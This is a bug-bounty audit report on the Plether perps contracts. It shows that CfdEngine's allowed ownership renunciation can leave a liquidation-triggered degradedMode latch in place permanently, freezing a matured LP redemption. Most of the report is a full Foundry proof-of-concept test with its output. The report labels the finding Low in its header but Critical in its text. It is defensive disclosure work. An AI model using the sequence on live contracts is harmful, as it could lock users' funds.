# \#98337 [SC-Low] Engine renunciation permanently locks mature LP redemptions after recoverable containment

**Submitted on Nov 7th 2026 at 04:54:49 UTC by @tinnohofficial for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98337
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Permanent freezing of funds

## Description

## Brief/Intro

**Severity: Critical — permanent freezing of LP funds.** `CfdEngine` permits its owner to renounce ownership while the protocol is healthy. A later public liquidation can latch `degradedMode`. Even after every position closes, trader claims are zero, and the Pool again covers all remaining liability, only the now nonexistent Engine owner can clear the latch. `HousePool` consequently cannot fund a mature Senior redemption, while the vault holds the LP's shares in escrow and no longer permits cancellation. A retained-owner control funds **393,952.964438 USDG** after the same incident; the renounced-owner branch remains unfunded after another 30 days.

## Why this is not the documented design / not the known item

Cecuro LOW-59 identified ownerless emergency recovery and recommended disabling renunciation in **every** governance-bearing perps contract. The project's recorded fix disabled it in `HousePool`, `OrderRouterAdmin`, and `EmergencyPauseCoordinator`, but omitted the Engine, which alone can clear this degraded latch. This is the concrete failure of that incomplete fix: a non-trusted LP's mature redemption stays locked after solvency is restored. The [security note](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L123-L128) and [later treasury test](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/admin/TreasuryProposal.t.sol#L340-L352) explicitly contemplate Engine renunciation for treasury activation, so the omission may be deliberate; neither accepts a permanent LP withdrawal lock. LOW-59's broad recommendation and the required owner action are real validity objections, but the demonstrated victim impact was not remediated.

## Vulnerability Details

[`CfdEngine` inherits `CfdTreasury`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L37-L46), which [inherits `Ownable2Step`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdTreasury.sol#L4-L10). Neither overrides `renounceOwnership()`. The [Pool](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L264-L267), [Router admin](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterAdmin.sol#L124-L127), and [emergency coordinator](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/EmergencyPauseCoordinator.sol#L101-L104) expressly reject it to preserve recovery authority.

A [liquidation latches `degradedMode`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1368) when effective Pool assets fall below the remaining maximum-profit liability. Closing the book does not automatically clear it. The [only clear function](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L655-L667) is `onlyOwner`, including after solvency recovers. The [security runbook](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1499-L1511) expects governance to clear degraded mode once assets again cover liability.

[`HousePool.settleLpEpoch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L835) [reverts while Engine degraded mode is set](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1870). A redeem request [escrows the LP's shares](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631); [cancellation is forbidden from its maturity epoch onward](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L877-L913), and [only the Pool can fund it](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1478-L1503).

The release-parameter Foundry PoC requests a Senior redemption before healthy Engine renunciation. Ordinary trader accounts open opposite positions. A permissionless keeper liquidates one leg at the Friday FAD boundary and the other closes through the public V3 order route. The Pool then has **10,009,266.947006 USDG**, with **zero** trader claims, open positions, or maximum-profit liability; nevertheless, the mature request cannot be settled or cancelled. A fresh mark and 30 days do not change that state. With Engine ownership retained, the same sequence initially blocks settlement, then `clearDegradedMode()` allows funding of **393,952.964438 USDG**. Both tests and both fresh runs are in the Proof of Concept section.

## Impact Details

The affected non-trusted LP can neither receive its mature redemption nor recover its escrowed shares through cancellation. No owner remains to perform the documented recovery step. This is **permanent freezing of funds**, the competition's Critical impact category. Already funded claims are unaffected. LOW-59 may still cause a known-issue rejection if its general ownerless-recovery finding is treated as covering every omitted contract; similarly, a sponsor that treats voluntary Engine renunciation as accepted governance risk may reject validity. Those objections do not change the measured on-chain impact.

### Recommendation

Override `renounceOwnership()` in `CfdEngine` or `CfdTreasury` to revert, as in the three protected peers. If Engine renunciation must remain possible, preserve a narrowly scoped authority to clear a solvent degraded latch. Add a regression covering healthy renunciation, later public liquidation, empty-book recovery, and funding of a mature LP request.

## References

- [Cecuro LOW-59 in the repository](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf): recommendation to disable renunciation in every governance-bearing contract and recorded three-contract fix.
- [Engine recovery function](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L655-L667); [Pool settlement gate](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L823-L835).


## Proof of Concept

# Reproduction

Place the complete test below at `packages/perps/test/poc/RenouncedEnginePermanentContainmentV3.t.sol` in the audit repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Run from the repository root. It exercises unmodified perps source through public Router and Pool entrypoints with MockPyth updates and release parameters. All balances use six-decimal USDG atoms. No public-network transaction is sent.

```sh
NO_COLOR=1 forge test --root packages/perps --match-path test/poc/RenouncedEnginePermanentContainmentV3.t.sol -vv
```

The renounced-owner branch proves the mature LP funding lock after a public liquidation and complete closure of the book. The retained-owner control reaches the same containment gate, then clears it and funds the request.

## Complete test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Exercises the release ownership and containment paths through their public entrypoints.
contract RenouncedEnginePermanentContainmentV3Test is BasePerpTest {

    address internal constant LONG_TRADER = address(0xA11CE);
    address internal constant SHORT_TRADER = address(0xB0B);
    address internal constant KEEPER = address(0x4EE9E7);

    uint256 internal constant FAD_START = 1_729_283_400; // Friday 2024-10-18 16:30 EDT.
    uint256 internal constant BUILD_TIME = FAD_START - 2 hours - 30 minutes;
    uint256 internal constant OPEN_CHUNK = 3_900_000e18;
    uint256 internal constant FINAL_CHUNK = 2_160_000e18;
    uint256 internal constant TOTAL_SIZE = 2 * OPEN_CHUNK + FINAL_CHUNK;
    uint256 internal constant MOVED_PRICE = 100_700_000;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 2_500_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 7_500_000e6;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(config);

        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release minimum order notional");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen-close spread");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release confidence cap");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release adverse confidence multiplier");
    }

    function test_RenouncedEngineMakesRecoverableContainmentPermanentForLpWithdrawals() public {
        _go(BUILD_TIME);
        _refresh(1e8);

        uint256 requestedShares = seniorVault.balanceOf(address(this)) / 20;
        uint256 redeemRequestId = seniorVault.requestRedeem(requestedShares, address(this), address(this));
        emit log_named_uint("Senior shares escrowed for redemption", requestedShares);

        // The Engine is fully wired and live before governance invokes its inherited public action.
        assertEq(engine.owner(), address(this));
        engine.renounceOwnership();
        assertEq(engine.owner(), address(0));
        emit log_named_address("Engine recovery owner after renunciation", engine.owner());

        _enterContainmentAndCloseEveryPosition();

        assertTrue(engine.degradedMode(), "containment latch must remain set after the position book is empty");
        assertFalse(engine.terminalNavSnapshot().hasOpenPositions, "all trader positions must be closed");
        assertEq(_maxLiability(), 0, "an empty position book has no remaining maximum-profit liability");
        uint256 poolAssetsAfterClose = pool.totalAssets();
        uint256 traderClaimsAfterClose = engine.totalTraderClaimBalanceAssets();
        emit log_named_uint("Pool assets after every position closes", poolAssetsAfterClose);
        emit log_named_uint("Outstanding trader claims after every position closes", traderClaimsAfterClose);
        emit log_named_uint("Maximum remaining trader liability", _maxLiability());
        assertGt(
            poolAssetsAfterClose,
            traderClaimsAfterClose,
            "pool effective assets are positive after the incident"
        );
        emit log_named_uint("Effective pool assets after every position closes", poolAssetsAfterClose - traderClaimsAfterClose);
        assertFalse(pool.isWithdrawalLive(), "the sticky latch keeps LP withdrawal funding disabled");

        _go(1_729_462_500); // Sunday 2024-10-20 18:15 EDT, well after the LP request matured.
        _refresh(MOVED_PRICE);

        (bool settled,) = address(pool).call(abi.encodeWithSignature("settleLpEpoch(uint256,uint256)", 0, 0));
        assertFalse(settled, "degraded containment must block permissionless LP epoch settlement");
        uint256 claimableSharesAtMaturity = seniorVault.claimableRedeemRequest(redeemRequestId, address(this));
        uint256 claimableAssetsAtMaturity = seniorVault.claimableRedeemAssets(redeemRequestId, address(this));
        emit log_named_uint("Claimable Senior shares after maturity", claimableSharesAtMaturity);
        emit log_named_uint("Claimable Senior assets after maturity", claimableAssetsAtMaturity);
        assertEq(claimableSharesAtMaturity, 0, "the matured Senior redemption shares remain unfunded");
        assertEq(claimableAssetsAtMaturity, 0, "the matured Senior redemption assets remain unfunded");

        (bool cleared,) = address(engine).call(abi.encodeWithSelector(engine.clearDegradedMode.selector));
        assertFalse(cleared, "the former owner cannot clear containment after ownership is renounced");

        _go(vm.getBlockTimestamp() + 30 days);
        _refresh(MOVED_PRICE);
        assertEq(engine.owner(), address(0), "elapsed time and a valid mark cannot restore the recovery owner");
        assertTrue(engine.degradedMode(), "elapsed time and a valid mark cannot clear the containment latch");
        (settled,) = address(pool).call(abi.encodeWithSignature("settleLpEpoch(uint256,uint256)", 0, 0));
        assertFalse(settled, "time alone cannot clear the sticky degraded latch");
        uint256 claimableSharesAfterThirtyDays = seniorVault.claimableRedeemRequest(redeemRequestId, address(this));
        uint256 claimableAssetsAfterThirtyDays = seniorVault.claimableRedeemAssets(redeemRequestId, address(this));
        emit log_named_uint("Claimable Senior shares after another thirty days", claimableSharesAfterThirtyDays);
        emit log_named_uint("Claimable Senior assets after another thirty days", claimableAssetsAfterThirtyDays);
        assertEq(claimableSharesAfterThirtyDays, 0);
        assertEq(claimableAssetsAfterThirtyDays, 0);
    }

    function test_GuardedPoolRejectsRenunciationAndEngineOwnerCanRestoreLpWithdrawals() public {
        address poolOwnerBefore = pool.owner();
        (bool poolRenounced,) = address(pool).call(abi.encodeWithSelector(pool.renounceOwnership.selector));
        assertFalse(poolRenounced, "the remediated pool must reject ownership renunciation");
        assertEq(pool.owner(), poolOwnerBefore, "the guarded recovery owner must remain installed");

        _go(BUILD_TIME);
        _refresh(1e8);
        uint256 requestedShares = seniorVault.balanceOf(address(this)) / 20;
        uint256 redeemRequestId = seniorVault.requestRedeem(requestedShares, address(this), address(this));
        emit log_named_uint("Control Senior shares escrowed for redemption", requestedShares);

        _enterContainmentAndCloseEveryPosition();
        assertTrue(engine.degradedMode());
        assertFalse(engine.terminalNavSnapshot().hasOpenPositions);
        assertEq(_maxLiability(), 0);

        _go(1_729_462_500);
        _refresh(MOVED_PRICE);
        (bool settled,) = address(pool).call(abi.encodeWithSignature("settleLpEpoch(uint256,uint256)", 0, 0));
        assertFalse(settled, "the control must first observe the same containment gate");
        uint256 controlSharesWhileContained = seniorVault.claimableRedeemRequest(redeemRequestId, address(this));
        uint256 controlAssetsWhileContained = seniorVault.claimableRedeemAssets(redeemRequestId, address(this));
        emit log_named_uint("Control claimable Senior shares before recovery", controlSharesWhileContained);
        emit log_named_uint("Control claimable Senior assets before recovery", controlAssetsWhileContained);
        assertEq(controlSharesWhileContained, 0, "the control must reproduce the same unfunded shares");
        assertEq(controlAssetsWhileContained, 0, "the control must reproduce the same unfunded assets");

        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "the retained Engine owner can clear a now-solvent latch");
        (settled,) = address(pool).call(abi.encodeWithSignature("settleLpEpoch(uint256,uint256)", 0, 0));
        assertTrue(settled, "LP settlement must resume after the owner clears containment");
        uint256 fundedControlShares = seniorVault.claimableRedeemRequest(redeemRequestId, address(this));
        uint256 fundedControlAssets = seniorVault.claimableRedeemAssets(redeemRequestId, address(this));
        emit log_named_uint("Control claimable Senior shares after recovery", fundedControlShares);
        emit log_named_uint("Control claimable Senior assets after recovery", fundedControlAssets);
        assertGt(
            fundedControlShares,
            0,
            "the matured Senior redemption shares become funded in the control"
        );
        assertGt(
            fundedControlAssets,
            0,
            "the matured Senior redemption assets become funded in the control"
        );
    }

    function _enterContainmentAndCloseEveryPosition() internal {
        _fundTrader(LONG_TRADER, 600_000e6);
        _fundTrader(SHORT_TRADER, 600_000e6);

        _openViaRouter(LONG_TRADER, CfdTypes.Side.LONG, OPEN_CHUNK, 78_000e6, 1e8);
        _openViaRouter(SHORT_TRADER, CfdTypes.Side.SHORT, OPEN_CHUNK, 78_000e6, 1e8);
        _openViaRouter(LONG_TRADER, CfdTypes.Side.LONG, OPEN_CHUNK, 78_000e6, 1e8);
        _openViaRouter(SHORT_TRADER, CfdTypes.Side.SHORT, OPEN_CHUNK, 78_000e6, 1e8);
        _openViaRouter(LONG_TRADER, CfdTypes.Side.LONG, FINAL_CHUNK, 43_200e6, 1e8);
        _openViaRouter(SHORT_TRADER, CfdTypes.Side.SHORT, FINAL_CHUNK, 43_200e6, 1e8);

        _go(FAD_START - 30);
        _refresh(MOVED_PRICE);
        vm.prank(LONG_TRADER);
        engine.addMargin(LONG_TRADER, 250_000e6);

        _go(FAD_START + 5);
        _refresh(MOVED_PRICE);
        assertTrue(
            engineLens.isLiquidatableAt(SHORT_TRADER, MOVED_PRICE, pool.totalAssets()),
            "the thin profitable leg must be liquidatable at the release FAD boundary"
        );
        uint64 publishTime = uint64(vm.getBlockTimestamp());
        bytes[] memory liquidationData = _tick(MOVED_PRICE, publishTime, publishTime - 1);
        vm.prank(KEEPER);
        router.executeLiquidation(SHORT_TRADER, liquidationData);
        assertTrue(engine.degradedMode(), "the public liquidation must latch containment");

        _closeViaRouter(LONG_TRADER, CfdTypes.Side.LONG, TOTAL_SIZE, MOVED_PRICE);
    }

    /// @dev Calls the production V3 public commitment selector with complete bounded intent.
    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal view returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(block.timestamp + router.maxExecutionWindowSeconds());
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _openViaRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, false);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        uint64 commitTime = uint64(vm.getBlockTimestamp());
        _go(commitTime + 1);
        bytes[] memory updateData = _tick(price, commitTime + 1, commitTime);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open must execute");
    }

    function _closeViaRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, size, 0, true);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        uint64 commitTime = uint64(vm.getBlockTimestamp());
        _go(commitTime + 1);
        bytes[] memory updateData = _tick(price, commitTime + 1, commitTime);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close must execute");
    }

    function _refresh(
        uint256 price
    ) internal {
        _go(vm.getBlockTimestamp() + 1);
        uint64 publishTime = uint64(vm.getBlockTimestamp());
        bytes[] memory updateData = _tick(price, publishTime, publishTime - 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(updateData);
    }

    function _tick(
        uint256 price,
        uint64 publishTime,
        uint64 previousPublishTime
    ) internal returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        baseMockPyth.setAllPrices(ids, int64(uint64(price)), int32(-8), uint256(publishTime));
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, int32(-8), publishTime, previousPublishTime)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _go(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

}
```

## Run 1 output

The Foundry test-runner section is reproduced verbatim; compiler warnings are omitted.

```text
Ran 2 tests for test/poc/RenouncedEnginePermanentContainmentV3.t.sol:RenouncedEnginePermanentContainmentV3Test
[PASS] test_GuardedPoolRejectsRenunciationAndEngineOwnerCanRestoreLpWithdrawals() (gas: 15364228)
Logs:
  Control Senior shares escrowed for redemption: 374993300128247
  Control claimable Senior shares before recovery: 0
  Control claimable Senior assets before recovery: 0
  Control claimable Senior shares after recovery: 374993300128247
  Control claimable Senior assets after recovery: 393952964438

[PASS] test_RenouncedEngineMakesRecoverableContainmentPermanentForLpWithdrawals() (gas: 15310239)
Logs:
  Senior shares escrowed for redemption: 374993300128247
  Engine recovery owner after renunciation: 0x0000000000000000000000000000000000000000
  Pool assets after every position closes: 10009266947006
  Outstanding trader claims after every position closes: 0
  Maximum remaining trader liability: 0
  Effective pool assets after every position closes: 10009266947006
  Claimable Senior shares after maturity: 0
  Claimable Senior assets after maturity: 0
  Claimable Senior shares after another thirty days: 0
  Claimable Senior assets after another thirty days: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 35.11ms (31.82ms CPU time)

Ran 1 test suite in 36.33ms (35.11ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

## Run 2 output

The Foundry test-runner section is reproduced verbatim; compiler warnings are omitted.

```text
Ran 2 tests for test/poc/RenouncedEnginePermanentContainmentV3.t.sol:RenouncedEnginePermanentContainmentV3Test
[PASS] test_GuardedPoolRejectsRenunciationAndEngineOwnerCanRestoreLpWithdrawals() (gas: 15364228)
Logs:
  Control Senior shares escrowed for redemption: 374993300128247
  Control claimable Senior shares before recovery: 0
  Control claimable Senior assets before recovery: 0
  Control claimable Senior shares after recovery: 374993300128247
  Control claimable Senior assets after recovery: 393952964438

[PASS] test_RenouncedEngineMakesRecoverableContainmentPermanentForLpWithdrawals() (gas: 15310239)
Logs:
  Senior shares escrowed for redemption: 374993300128247
  Engine recovery owner after renunciation: 0x0000000000000000000000000000000000000000
  Pool assets after every position closes: 10009266947006
  Outstanding trader claims after every position closes: 0
  Maximum remaining trader liability: 0
  Effective pool assets after every position closes: 10009266947006
  Claimable Senior shares after maturity: 0
  Claimable Senior assets after maturity: 0
  Claimable Senior shares after another thirty days: 0
  Claimable Senior assets after another thirty days: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 32.76ms (38.99ms CPU time)

Ran 1 test suite in 35.43ms (32.76ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

